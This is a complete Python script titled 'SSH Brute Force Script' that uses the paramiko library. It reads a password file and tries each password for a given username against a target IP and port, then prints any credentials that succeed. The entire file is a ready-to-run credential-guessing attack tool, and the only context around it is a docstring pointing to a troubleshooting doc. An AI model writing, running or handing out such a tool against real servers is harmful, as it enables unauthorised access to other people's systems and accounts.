#!/usr/bin/env python3
"""
SSH Brute Force Script
Source: docs/troubleshooting/ssh-bruteforce-attack.md
"""

import paramiko
import time
import sys

def brute_force_ssh(host, port, username, password_list):
    """
    Attempt SSH login using a list of passwords.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            print(f"[*] Trying {username}:{password}")
            client.connect(host, port=port, username=username, password=password, timeout=3)
            print(f"[+] SUCCESS! Username: {username} | Password: {password}")
            client.close()
            return True
        except paramiko.AuthenticationException:
            continue
        except Exception as e:
            print(f"[-] Error: {e}")
            continue
        finally:
            client.close()

    print("[-] Brute-force finished. No valid credentials found.")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python ssh_bruteforce.py <target_ip> <port> <username> <password_file>")
        sys.exit(1)

    target_ip = sys.argv[1]
    port = int(sys.argv[2])
    username = sys.argv[3]
    password_file = sys.argv[4]

    try:
        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"[-] Password file {password_file} not found.")
        sys.exit(1)

    brute_force_ssh(target_ip, port, username, passwords)